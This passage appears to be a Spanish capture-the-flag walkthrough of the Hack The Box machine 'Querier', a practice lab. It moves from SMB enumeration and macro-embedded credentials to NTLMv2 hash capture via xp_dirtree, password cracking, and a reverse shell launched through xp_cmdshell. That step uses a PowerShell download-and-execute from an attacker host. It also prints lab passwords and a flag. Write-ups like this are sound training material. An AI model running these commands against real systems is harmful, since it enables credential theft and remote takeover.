  <li>Vamos a cuales si tenemos capacidad de lectura o escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.67.247 <span class="nt">-u</span> <span class="s1">'null'</span>

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
 <span class="nt">-----------------------------------------------------------------------------</span>
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
</code></pre></div></div>

<ul>
  <li>Tenemos capacidad de lectura al recurso <code class="language-plaintext highlighter-rouge">Reports</code> vamos a enumerar lo que esta adentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.67.247 <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">-r</span> Reports

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
 <span class="nt">-----------------------------------------------------------------------------</span>
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
	./Reports
	dr--r--r--                0 Mon Jan 28 17:26:31 2019	<span class="nb">.</span>
	dr--r--r--                0 Mon Jan 28 17:26:31 2019	..
	fr--r--r--            12229 Mon Jan 28 17:26:31 2019	Currency Volume Report.xlsm
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.xlsm</code>.</li>
</ul>

<blockquote>
  <p>El formato de archivo XLSM es parte de la aplicación de hoja de cálculo de Microsoft Excel. Es un formato de archivo de libro de trabajo habilitado para macros que permite a los usuarios almacenar y compartir macros y datos de hojas de cálculo.</p>
</blockquote>

<ul>
  <li>Vamos a emplear <code class="language-plaintext highlighter-rouge">smbclient</code> para conectarnos y descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient //10.129.67.247/Reports <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Mon Jan 28 17:23:48 2019
  ..                                  D        0  Mon Jan 28 17:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019

		5158399 blocks of size 4096. 850432 blocks available
smb: <span class="se">\&gt;</span> get <span class="s2">"Currency Volume Report.xlsm"</span>
getting file <span class="se">\C</span>urrency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm <span class="o">(</span>33.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 33.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos abrirlo con <code class="language-plaintext highlighter-rouge">libreoffice</code>.</p>
  </li>
  <li>
    <p>De primeras no vemos nada.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/querier/1.png" />
</p>

<ul>
  <li>
    <p>Pero podemos ver las macros <a href="https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos">https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos</a> yéndonos al apartado <code class="language-plaintext highlighter-rouge">Tools</code> y Macros.</p>
  </li>
  <li>
    <p>Podemos ver básicamente una función que se llama <code class="language-plaintext highlighter-rouge">Connect().</code></p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/querier/2.png" />
</p>

<ul>
  <li>Se conecta a una base de datos <code class="language-plaintext highlighter-rouge">SQL Server</code> y nos comparten credenciales además de leer el contenido de la tabla <code class="language-plaintext highlighter-rouge">volume</code>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Usuario</th>
      <th>Contraseña</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>reporting</td>
      <td>PcwTWTHRwryjc$c6</td>
    </tr>
  </tbody>
</table>

<h2 id="shell-as-mssql-svc">Shell as mssql-svc</h2>

<ul>
  <li>Vamos a validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] HTB.LOCAL<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> STATUS_NO_LOGON_SERVERS
</code></pre></div></div>

<ul>
  <li>Bueno si probamos haciéndolo a nivel de <code class="language-plaintext highlighter-rouge">WORKGROUP</code> o autenticación local si nos funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">--local-auth</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">-d</span> WORKGROUP
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
</code></pre></div></div>

<ul>
  <li>Bueno lo que vamos hacer es que como tenemos el puerto <code class="language-plaintext highlighter-rouge">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM</code> abierto nos vamos a conectar al servicio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient WORKGROUP/reporting@10.129.67.247 <span class="nt">-windows-auth</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'volume'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>No podemos usar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y tampoco podemos activarlo por que no tenemos permisos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: The EXECUTE permission was denied on the object <span class="s1">'xp_cmdshell'</span>, database <span class="s1">'mssqlsystemresource'</span>, schema <span class="s1">'sys'</span><span class="nb">.</span>
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> <span class="nb">enable </span>xp_cmdshell
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Incorrect syntax near <span class="s1">'xp_cmdshell'</span><span class="nb">.</span>
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 105: User does not have permission to perform this action.
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
</code></pre></div></div>

<ul>
  <li>Lo que podemos hacer es roba el hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> en el proceso de la autenticación abusando del <code class="language-plaintext highlighter-rouge">xp_dirtree</code> ya que nos permite listar recursos compartidos a nivel de red de algún servidor y nosotros desde nuestra maquina de atacante con <code class="language-plaintext highlighter-rouge">smbserver</code> vamos a crear un recurso a nivel de red para que se autentique y capturar el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver b <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora si usamos <code class="language-plaintext highlighter-rouge">xp_dirtree</code> para listar los recursos compartidos por detrás viaja la autenticación y capturaremos el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> xp_dirtree <span class="se">\\</span>10.10.15.11<span class="se">\s</span>mbserver
subdirectory   depth   file
<span class="nt">------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Capturamos el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver b <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.67.247,49675<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc,QUERIER<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\m</span>ssql-svc authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:254a4df4a95e2690a16c8afd14b68f0a:01010000000000008088a8e09187da0102326448f746e93a00000000010010004d007500590056006700510047004600030010004d00750059005600670051004700460002001000530075006f0053006b006d007900540004001000530075006f0053006b006d0079005400070008008088a8e09187da0106000400020000000800300030000000000000000000000000300000b8458b27b9ac92b92824508e47e300b1dd167c58ec5b12b4846757d2eb899f100a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003100000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span>-] SMB2_TREE_CONNECT not found smbserver
<span class="o">[</span>-] SMB2_TREE_CONNECT not found smbserver
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>QUERIER<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.67.247,49675<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a crackear el hash para ver la contraseña en texto plano.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
corporate568     <span class="o">(</span>mssql-svc<span class="o">)</span>
1g 0:00:00:42 DONE <span class="o">(</span>2024-04-05 13:48<span class="o">)</span> 0.02369g/s 212247p/s 212247c/s 212247C/s correforenz..corococo
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Vamos a validar que la contraseña es valida.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> <span class="s1">'mssql-svc'</span> <span class="nt">-p</span> <span class="s1">'corporate568'</span> <span class="nt">--local-auth</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\m</span>ssql-svc:corporate568
</code></pre></div></div>

<ul>
  <li>Como el usuario se llama <code class="language-plaintext highlighter-rouge">mssql-svc</code> nos podemos conectar a <code class="language-plaintext highlighter-rouge">mssql</code> también.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient WORKGROUP/mssql-svc@10.129.67.247 <span class="nt">-windows-auth</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora simplemente tenemos que habilitarlo para poder usar el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">'sys.xp_cmdshell'</span> of component <span class="s1">'xp_cmdshell'</span> because this component is turned off as part of the security configuration <span class="k">for </span>this server. A system administrator can <span class="nb">enable </span>the use of <span class="s1">'xp_cmdshell'</span> by using sp_configure. For more information about enabling <span class="s1">'xp_cmdshell'</span>, search <span class="k">for</span> <span class="s1">'xp_cmdshell'</span> <span class="k">in </span>SQL Server Books Online.
</code></pre></div></div>

<ul>
  <li>Vemos que ahora cambia a 1 ya podemos usarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos ejecutar comandos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
output
<span class="nt">-----------------</span>
querier<span class="se">\m</span>ssql-svc

NULL

SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora podemos ganar acceso ala maquina empleando lo siguiente <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>.</p>
  </li>
  <li>
    <p>Vamos a modificar el script para entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> directamente.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443'</span> <span class="o">&gt;&gt;</span> Invoke-PowerShellTcp.ps1
➜  content <span class="nb">cat </span>Invoke-PowerShellTcp.ps1 | <span class="nb">tail</span> <span class="nt">-n</span> 1
Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.15.11 <span class="nt">-Port</span> 443
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutar un servicio <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Y ahora nos podemos en escucha por el puerto 443 para que nos llegue la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nvlp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora usamos el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"powershell IEX(New-Object Net.WebClient).downloadString(</span><span class="se">\"</span><span class="s2">http://10.10.15.11/Invoke-PowerShellTcp.ps1</span><span class="se">\"</span><span class="s2">)"</span>
</code></pre></div></div>

<ul>
  <li>Nos llega la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nvlp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.15.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.67.247] 49677
Windows PowerShell running as user mssql-svc on QUERIER
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
querier<span class="se">\m</span>ssql-svc
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e96e197911a391c99a71cd3596542670
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Tenemos el <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> <code class="language-plaintext highlighter-rouge">Enable</code> y podemos usar el <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a> para explotarlo pero no es la principal vía para escalar privilegios de la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
